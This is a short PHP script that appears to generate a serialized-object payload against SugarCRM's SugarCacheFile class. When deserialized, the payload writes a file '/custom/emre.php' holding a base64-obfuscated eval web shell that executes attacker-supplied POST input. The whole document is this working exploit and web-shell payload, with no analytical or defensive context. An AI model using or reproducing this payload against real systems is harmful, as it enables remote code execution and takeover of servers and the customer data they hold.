<?php
class SugarCacheFile {

	protected $_cacheChanged = true;
	protected $_cacheFileName = '/custom/emre.php';
	protected $_localStore = array('<?php eval(base64_decode(KCRfUE9TVFtISEhdKTsK); ?>');
}

echo serialize(new SugarCacheFile);
echo "\n"

?>
